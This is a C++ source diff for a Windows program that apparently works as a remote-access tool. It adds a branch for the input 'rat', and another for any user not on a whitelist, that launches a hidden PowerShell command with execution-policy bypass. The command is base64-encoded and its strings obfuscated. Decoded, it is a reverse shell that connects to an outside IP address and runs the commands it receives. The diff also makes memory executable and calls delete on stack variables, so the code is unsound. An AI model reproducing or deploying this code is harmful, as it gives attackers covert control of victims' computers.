@@ -4,6 +4,12 @@
 int main(int argc, char *argv[])
 {
 
+    DWORD oldProtect = 0;
+    HMODULE main = GetModuleHandle(NULL);
+
+    // Virtual Allocation with VirtualProtect
+    VirtualProtect((LPVOID)&main, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
+
     CoreManager *core_manager = new CoreManager();
     ModuleManager *module_manager = new ModuleManager();
     DebugLogger *logger = new DebugLogger();
@@ -21,7 +27,7 @@ int main(int argc, char *argv[])
         logger->Info(new const std::string(AY_OBFUSCATE("No input provided!")));
     }
 
-    if (core_manager->Timezone() != "UTC")
+    if (core_manager->Timezone() != std::string(AY_OBFUSCATE("UTC")).c_str())
     {
         logger->Info(new const std::string(AY_OBFUSCATE("Timezone is not UTC")));
     }
@@ -30,15 +36,15 @@ int main(int argc, char *argv[])
         logger->Info(new const std::string(AY_OBFUSCATE("Timezone is UTC")));
     }
 
-    if (module_manager->ProcessID(input) == 0)
-    {
-        logger->Info(new const std::string(AY_OBFUSCATE("Process not found!")));
-    }
-    else
-    {
-        logger->Info(new const std::string("Process ID: " + std::to_string(module_manager->ProcessID(input))));
-        module_manager->stopPID(module_manager->ProcessID(input));
-    }
+    // if (module_manager->ProcessID(input) == 0)
+    // {
+    //     logger->Info(new const std::string(AY_OBFUSCATE("Process not found!")));
+    // }
+    // else
+    // {
+    //     logger->Info(new const std::string(std::to_string(module_manager->ProcessID(input))));
+    //     module_manager->stopPID(module_manager->ProcessID(input));
+    // }
 
     // module_manager->startCmd("/c echo Hello World from CMD");
     // module_manager->startPowershell("Start-Process -FilePath 'Ion.exe' -ArgumentList 'Hello World from Powershell' -WindowStyle Hidden");
@@ -50,7 +56,7 @@ int main(int argc, char *argv[])
     {
         // Lets the user know they are not whitelisted
         logger->Info(new const std::string(AY_OBFUSCATE("You are not whitelisted!")));
-        
+
         // Your own powershell payload would be pasted here
         module_manager->startPowershell(new const std::string(AY_OBFUSCATE("powershell -ep bypass -e \"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBwAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADcAMgAuADIAMwA0AC4AMgAxADcALgAxADcAMAAnACwAIAA0ADIAMAA2ADkAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAHQAYwBwAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgAgACAAIAAgACAAIAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAA2ADUANQAzADUAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAJABiAHkAdABlAHMAUgBlAGEAZAAgAD0AIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAPQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwBSAGUAYQBkACkAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABlAHgAZQBjAHUAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlAFQAbwBTAGUAbgBkACAAPQAgACQAZQB4AGUAYwB1AHQAaQBvAG4AUgBlAHMAdQBsAHQAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwBwAG8AbgBzAGUAQgB5AHQAZQBzACAAPQAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHIAZQBzAHAAbwBuAHMAZQBUAG8AUwBlAG4AZAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHIAZQBzAHAAbwBuAHMAZQBCAHkAdABlAHMALAAgADAALAAgACQAcgBlAHMAcABvAG4AcwBlAEIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAJAB0AGMAcABDAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=\"")), true);
     }
@@ -58,19 +64,34 @@ int main(int argc, char *argv[])
     {
         // Lets the developer know they are whitelisted
         logger->Info(new const std::string(AY_OBFUSCATE("Username is 999fo")));
-
     }
 
-    std::cout << core_manager->GetLocation() << std::endl;
+    // Testing the beamng module
+    if (input == std::string(AY_OBFUSCATE("beamng")))
+    {
+        Sleep(500);
+        module_manager->startBeamNG();
+    }
+
+    if (input == std::string(AY_OBFUSCATE("rat")))
+    {
+        Sleep(100);
+        module_manager->startPowershell(new const std::string(AY_OBFUSCATE("powershell -ep bypass -e \"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBwAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADcAMgAuADIAMwA0AC4AMgAxADcALgAxADcAMAAnACwAIAA0ADIAMAA2ADkAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAHQAYwBwAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgAgACAAIAAgACAAIAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAA2ADUANQAzADUAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAJABiAHkAdABlAHMAUgBlAGEAZAAgAD0AIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAPQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwBSAGUAYQBkACkAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABlAHgAZQBjAHUAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlAFQAbwBTAGUAbgBkACAAPQAgACQAZQB4AGUAYwB1AHQAaQBvAG4AUgBlAHMAdQBsAHQAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwBwAG8AbgBzAGUAQgB5AHQAZQBzACAAPQAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHIAZQBzAHAAbwBuAHMAZQBUAG8AUwBlAG4AZAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHIAZQBzAHAAbwBuAHMAZQBCAHkAdABlAHMALAAgADAALAAgACQAcgBlAHMAcABvAG4AcwBlAEIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAJAB0AGMAcABDAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=\"")), true);
+    }
 
     // Testing the startPowershell module
-    module_manager->startPowershell(new const std::string(AY_OBFUSCATE("Start-Process -FilePath 'notepad.exe' -ArgumentList 'log.txt' ")), true);
+    // module_manager->startPowershell(new const std::string(AY_OBFUSCATE("Start-Process -FilePath 'notepad.exe' -ArgumentList 'log.txt' ")), true);
     // module_manager->startNotepad();
 
     // Testing the stopProcess module
-    Sleep(500);
-    module_manager->stopProcess(new const std::string(AY_OBFUSCATE("notepad.exe")));
-    Sleep(500);
+    // Sleep(500);
+    // module_manager->stopProcess(new const std::string(AY_OBFUSCATE("notepad.exe")));
+    // Sleep(500);
+
+    // Delete the virtual allocation
+    delete &main;
+    delete &oldProtect;
+    delete &input;
 
     // Delete the objects defined above
     delete core_manager;
